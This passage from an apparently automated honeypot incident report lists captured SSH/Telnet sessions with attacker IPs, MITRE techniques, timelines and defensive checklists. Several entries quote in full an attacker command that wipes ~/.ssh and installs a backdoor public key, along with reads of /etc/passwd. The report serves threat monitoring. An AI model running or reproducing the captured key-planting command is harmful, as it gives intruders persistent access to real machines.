| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:57` | `cowrie.session.connect` |
| `2026-09-24 05:18:57` | `cowrie.client.version` |
| `2026-09-24 05:18:57` | `cowrie.client.kex` |
| `2026-09-24 05:18:59` | `cowrie.login.success` |
| `2026-09-24 05:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.79.192[.]73` to AbuseIPDB if not already reported
- [ ] Block `115.79.192[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298c9d692bce

| Field | Detail |
|---|---|
| **Source IP** | `116.71.136[.]125` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:58` | `cowrie.session.connect` |
| `2026-09-24 05:18:58` | `cowrie.client.version` |
| `2026-09-24 05:18:58` | `cowrie.client.kex` |
| `2026-09-24 05:18:59` | `cowrie.login.success` |
| `2026-09-24 05:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.71.136[.]125` to AbuseIPDB if not already reported
- [ ] Block `116.71.136[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3c7e9206bf

| Field | Detail |
|---|---|
| **Source IP** | `115.79.192[.]73` |
| **First Seen** | 2026-09-24 05:18 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:18:59` | `cowrie.session.connect` |
| `2026-09-24 05:18:59` | `cowrie.client.version` |
| `2026-09-24 05:18:59` | `cowrie.client.kex` |
| `2026-09-24 05:19:00` | `cowrie.login.success` |
| `2026-09-24 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.79.192[.]73` to AbuseIPDB if not already reported
- [ ] Block `115.79.192[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81551db28ee8

| Field | Detail |
|---|---|
| **Source IP** | `180.180.242[.]201` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:00` | `cowrie.session.connect` |
| `2026-09-24 05:19:00` | `cowrie.client.version` |
| `2026-09-24 05:19:00` | `cowrie.client.kex` |
| `2026-09-24 05:19:01` | `cowrie.login.success` |
| `2026-09-24 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.242[.]201` to AbuseIPDB if not already reported
- [ ] Block `180.180.242[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd2e2ce8e23

| Field | Detail |
|---|---|
| **Source IP** | `116.71.136[.]125` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:00` | `cowrie.session.connect` |
| `2026-09-24 05:19:00` | `cowrie.client.version` |
| `2026-09-24 05:19:00` | `cowrie.client.kex` |
| `2026-09-24 05:19:01` | `cowrie.login.success` |
| `2026-09-24 05:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.71.136[.]125` to AbuseIPDB if not already reported
- [ ] Block `116.71.136[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd28b1997aa

| Field | Detail |
|---|---|
| **Source IP** | `180.180.242[.]201` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:02` | `cowrie.session.connect` |
| `2026-09-24 05:19:02` | `cowrie.client.version` |
| `2026-09-24 05:19:02` | `cowrie.client.kex` |
| `2026-09-24 05:19:03` | `cowrie.login.success` |
| `2026-09-24 05:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.242[.]201` to AbuseIPDB if not already reported
- [ ] Block `180.180.242[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3644e6c54f1b

| Field | Detail |
|---|---|
| **Source IP** | `196.0.3[.]188` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:42` | `cowrie.session.connect` |
| `2026-09-24 05:19:42` | `cowrie.client.version` |
| `2026-09-24 05:19:42` | `cowrie.client.kex` |
| `2026-09-24 05:19:43` | `cowrie.login.success` |
| `2026-09-24 05:19:45` | `cowrie.session.params` |
| `2026-09-24 05:19:45` | `cowrie.command.input` |
| `2026-09-24 05:19:45` | `cowrie.command.failed` |
| `2026-09-24 05:19:45` | `cowrie.log.closed` |
| `2026-09-24 05:19:46` | `cowrie.session.params` |
| `2026-09-24 05:19:46` | `cowrie.command.input` |
| `2026-09-24 05:19:46` | `cowrie.session.file_download` |
| `2026-09-24 05:19:46` | `cowrie.log.closed` |
| `2026-09-24 05:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.3[.]188` to AbuseIPDB if not already reported
- [ ] Block `196.0.3[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0aa296cf112

| Field | Detail |
|---|---|
| **Source IP** | `196.0.3[.]188` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:47` | `cowrie.session.connect` |
| `2026-09-24 05:19:47` | `cowrie.client.version` |
| `2026-09-24 05:19:47` | `cowrie.client.kex` |
| `2026-09-24 05:19:48` | `cowrie.login.success` |
| `2026-09-24 05:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.3[.]188` to AbuseIPDB if not already reported
- [ ] Block `196.0.3[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55036d638451

| Field | Detail |
|---|---|
| **Source IP** | `196.0.3[.]188` |
| **First Seen** | 2026-09-24 05:19 |
| **Last Seen** | 2026-09-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:19:48` | `cowrie.session.connect` |
| `2026-09-24 05:19:48` | `cowrie.client.version` |
| `2026-09-24 05:19:49` | `cowrie.client.kex` |
| `2026-09-24 05:19:50` | `cowrie.login.success` |
| `2026-09-24 05:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.3[.]188` to AbuseIPDB if not already reported
- [ ] Block `196.0.3[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6efbe2ed02

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]121` |
| **First Seen** | 2026-09-24 05:31 |
| **Last Seen** | 2026-09-24 05:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:31:02` | `cowrie.session.connect` |
| `2026-09-24 05:31:03` | `cowrie.login.success` |
| `2026-09-24 05:31:03` | `cowrie.session.params` |
| `2026-09-24 05:31:04` | `cowrie.command.input` |
| `2026-09-24 05:31:04` | `cowrie.command.input` |
| `2026-09-24 05:31:05` | `cowrie.command.input` |
| `2026-09-24 05:31:05` | `cowrie.command.input` |
| `2026-09-24 05:31:05` | `cowrie.command.failed` |
| `2026-09-24 05:31:06` | `cowrie.log.closed` |
| `2026-09-24 05:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]121` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddd97a375c3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 05:38 |
| **Last Seen** | 2026-09-24 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:38:14` | `cowrie.session.connect` |
| `2026-09-24 05:38:14` | `cowrie.client.version` |
| `2026-09-24 05:38:14` | `cowrie.client.kex` |
| `2026-09-24 05:38:14` | `cowrie.login.success` |
| `2026-09-24 05:38:14` | `cowrie.direct-tcpip.request` |
| `2026-09-24 05:38:14` | `cowrie.direct-tcpip.data` |
| `2026-09-24 05:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec880407745

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-24 05:52 |
| **Last Seen** | 2026-09-24 05:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:52:15` | `cowrie.session.connect` |
| `2026-09-24 05:52:17` | `cowrie.login.failed` |
| `2026-09-24 05:52:18` | `cowrie.login.success` |
| `2026-09-24 05:52:18` | `cowrie.session.params` |
| `2026-09-24 05:52:19` | `cowrie.command.input` |
| `2026-09-24 05:52:19` | `cowrie.command.failed` |
| `2026-09-24 05:52:19` | `cowrie.command.input` |
| `2026-09-24 05:52:19` | `cowrie.command.failed` |
| `2026-09-24 05:52:21` | `cowrie.command.input` |
| `2026-09-24 05:52:21` | `cowrie.command.failed` |
| `2026-09-24 05:52:21` | `cowrie.log.closed` |
| `2026-09-24 05:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4155bb575fb1

| Field | Detail |
|---|---|
| **Source IP** | `39.109.116[.]214` |
| **First Seen** | 2026-09-24 05:53 |
| **Last Seen** | 2026-09-24 05:54 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:53:54` | `cowrie.session.connect` |
| `2026-09-24 05:53:56` | `cowrie.telnet.option` |
| `2026-09-24 05:53:56` | `cowrie.telnet.option` |
| `2026-09-24 05:53:56` | `cowrie.login.success` |
| `2026-09-24 05:53:57` | `cowrie.session.params` |
| `2026-09-24 05:53:57` | `cowrie.telnet.option` |
| `2026-09-24 05:53:57` | `cowrie.telnet.option` |
| `2026-09-24 05:53:57` | `cowrie.command.input` |
| `2026-09-24 05:53:57` | `cowrie.command.input` |
| `2026-09-24 05:53:57` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.failed` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.command.input` |
| `2026-09-24 05:54:58` | `cowrie.log.closed` |
| `2026-09-24 05:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.109.116[.]214` to AbuseIPDB if not already reported
- [ ] Block `39.109.116[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f668be0c812c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]204` |
| **First Seen** | 2026-09-24 05:53 |
| **Last Seen** | 2026-09-24 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 05:53:55` | `cowrie.session.connect` |
| `2026-09-24 05:53:55` | `cowrie.telnet.option` |
| `2026-09-24 05:53:56` | `cowrie.telnet.option` |
| `2026-09-24 05:54:27` | `cowrie.login.success` |
| `2026-09-24 05:54:28` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]204` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28a70640685

| Field | Detail |
|---|---|
| **Source IP** | `34.62.244[.]233` |
| **First Seen** | 2026-09-24 06:06 |
| **Last Seen** | 2026-09-24 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:06:02` | `cowrie.session.connect` |
| `2026-09-24 06:06:02` | `cowrie.client.version` |
| `2026-09-24 06:06:02` | `cowrie.client.kex` |
| `2026-09-24 06:06:05` | `cowrie.login.success` |
| `2026-09-24 06:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.244[.]233` to AbuseIPDB if not already reported
- [ ] Block `34.62.244[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b889463bc7b4

| Field | Detail |
|---|---|
| **Source IP** | `161.132.40[.]54` |
| **First Seen** | 2026-09-24 06:28 |
| **Last Seen** | 2026-09-24 06:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:28:41` | `cowrie.session.connect` |
| `2026-09-24 06:28:41` | `cowrie.client.version` |
| `2026-09-24 06:28:41` | `cowrie.client.kex` |
| `2026-09-24 06:28:41` | `cowrie.login.success` |
| `2026-09-24 06:28:42` | `cowrie.session.params` |
| `2026-09-24 06:28:42` | `cowrie.command.input` |
| `2026-09-24 06:28:42` | `cowrie.command.failed` |
| `2026-09-24 06:28:42` | `cowrie.log.closed` |
| `2026-09-24 06:28:43` | `cowrie.session.params` |
| `2026-09-24 06:28:43` | `cowrie.command.input` |
| `2026-09-24 06:28:43` | `cowrie.session.file_download` |
| `2026-09-24 06:28:43` | `cowrie.log.closed` |
| `2026-09-24 06:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.40[.]54` to AbuseIPDB if not already reported
- [ ] Block `161.132.40[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef8a4acfaef

| Field | Detail |
|---|---|
| **Source IP** | `161.132.40[.]54` |
| **First Seen** | 2026-09-24 06:28 |
| **Last Seen** | 2026-09-24 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:28:43` | `cowrie.session.connect` |
| `2026-09-24 06:28:43` | `cowrie.client.version` |
| `2026-09-24 06:28:43` | `cowrie.client.kex` |
| `2026-09-24 06:28:44` | `cowrie.login.success` |
| `2026-09-24 06:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.40[.]54` to AbuseIPDB if not already reported
- [ ] Block `161.132.40[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd66718e4ec5

| Field | Detail |
|---|---|
| **Source IP** | `161.132.40[.]54` |
| **First Seen** | 2026-09-24 06:28 |
| **Last Seen** | 2026-09-24 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:28:44` | `cowrie.session.connect` |
| `2026-09-24 06:28:44` | `cowrie.client.version` |
| `2026-09-24 06:28:44` | `cowrie.client.kex` |
| `2026-09-24 06:28:45` | `cowrie.login.success` |
| `2026-09-24 06:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.40[.]54` to AbuseIPDB if not already reported
- [ ] Block `161.132.40[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-332b9443e718

| Field | Detail |
|---|---|
| **Source IP** | `14.18.236[.]71` |
| **First Seen** | 2026-09-24 06:31 |
| **Last Seen** | 2026-09-24 06:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:31:36` | `cowrie.session.connect` |
| `2026-09-24 06:31:41` | `cowrie.client.version` |
| `2026-09-24 06:31:41` | `cowrie.client.kex` |
| `2026-09-24 06:31:42` | `cowrie.login.success` |
| `2026-09-24 06:31:43` | `cowrie.session.params` |
| `2026-09-24 06:31:43` | `cowrie.command.input` |
| `2026-09-24 06:31:43` | `cowrie.command.failed` |
| `2026-09-24 06:31:44` | `cowrie.log.closed` |
| `2026-09-24 06:31:44` | `cowrie.session.params` |
| `2026-09-24 06:31:45` | `cowrie.command.input` |
| `2026-09-24 06:31:45` | `cowrie.session.file_download` |
| `2026-09-24 06:31:45` | `cowrie.log.closed` |
| `2026-09-24 06:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.236[.]71` to AbuseIPDB if not already reported
- [ ] Block `14.18.236[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cef91983844

| Field | Detail |
|---|---|
| **Source IP** | `14.18.236[.]71` |
| **First Seen** | 2026-09-24 06:31 |
| **Last Seen** | 2026-09-24 06:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:31:45` | `cowrie.session.connect` |
| `2026-09-24 06:31:45` | `cowrie.client.version` |
| `2026-09-24 06:31:45` | `cowrie.client.kex` |
| `2026-09-24 06:31:46` | `cowrie.login.success` |
| `2026-09-24 06:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.236[.]71` to AbuseIPDB if not already reported
- [ ] Block `14.18.236[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af880278910

| Field | Detail |
|---|---|
| **Source IP** | `14.18.236[.]71` |
| **First Seen** | 2026-09-24 06:31 |
| **Last Seen** | 2026-09-24 06:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:31:47` | `cowrie.session.connect` |
| `2026-09-24 06:31:47` | `cowrie.client.version` |
| `2026-09-24 06:31:47` | `cowrie.client.kex` |
| `2026-09-24 06:31:48` | `cowrie.login.success` |
| `2026-09-24 06:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.18.236[.]71` to AbuseIPDB if not already reported
- [ ] Block `14.18.236[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5348e2f6a901

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 06:40 |
| **Last Seen** | 2026-09-24 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 06:40:45` | `cowrie.session.connect` |
| `2026-09-24 06:40:45` | `cowrie.client.version` |
| `2026-09-24 06:40:45` | `cowrie.client.kex` |
| `2026-09-24 06:40:45` | `cowrie.login.success` |
| `2026-09-24 06:40:45` | `cowrie.direct-tcpip.request` |
| `2026-09-24 06:40:46` | `cowrie.direct-tcpip.data` |
| `2026-09-24 06:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ae5f2d14b4

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-24 07:01 |
| **Last Seen** | 2026-09-24 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:01:53` | `cowrie.session.connect` |
| `2026-09-24 07:01:54` | `cowrie.login.failed` |
| `2026-09-24 07:01:55` | `cowrie.login.success` |
| `2026-09-24 07:01:55` | `cowrie.session.params` |
| `2026-09-24 07:01:56` | `cowrie.command.input` |
| `2026-09-24 07:01:56` | `cowrie.command.failed` |
| `2026-09-24 07:01:56` | `cowrie.command.input` |
| `2026-09-24 07:01:56` | `cowrie.command.failed` |
| `2026-09-24 07:01:56` | `cowrie.command.input` |
| `2026-09-24 07:01:56` | `cowrie.command.failed` |
| `2026-09-24 07:01:56` | `cowrie.log.closed` |
| `2026-09-24 07:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6eaeca1c7a

| Field | Detail |
|---|---|
| **Source IP** | `194.226.49[.]237` |
| **First Seen** | 2026-09-24 07:10 |
| **Last Seen** | 2026-09-24 07:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
